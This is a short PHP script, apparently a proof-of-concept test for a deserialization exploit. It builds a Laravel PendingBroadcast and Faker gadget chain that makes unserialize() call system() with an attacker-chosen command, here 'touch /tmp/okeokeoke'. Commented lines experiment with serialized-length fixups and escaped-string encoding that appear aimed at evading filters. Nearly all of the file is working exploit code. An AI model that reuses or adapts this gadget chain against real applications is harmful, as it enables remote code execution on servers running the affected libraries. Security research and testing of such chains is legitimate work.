<?php
$t="s:278:\"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{S:9:\"\\00*\\00events\";O:20:\"Faker\\ValidGenerator\":3:{S:12:\"\\00*\\00generator\";O:22:\"Faker\\DefaultGenerator\":1:{S:10:\"\\00*\\00default\";S:20:\"touch \/tmp\/okeokeoke\";}S:13:\"\\00*\\00maxRetries\";i:1;S:12:\"\\00*\\00validator\";S:6:\"system\";}}\";";
// $t= serialize(serialize("\00abcd"));
// $t = preg_replace_callback ( '!s:(\d+):"(.*?)";!', function($match) {      
//     return ($match[1] == strlen($match[2])) ? $match[0] : 's:' . strlen($match[2]) . ':"' . $match[2] . '";';
// },$t );
// var_dump($t);
echo $t;
// echo unserialize("S:12:\"\\00*\\00generator\";");
// echo $t;
    echo unserialize(unserialize($t));
?>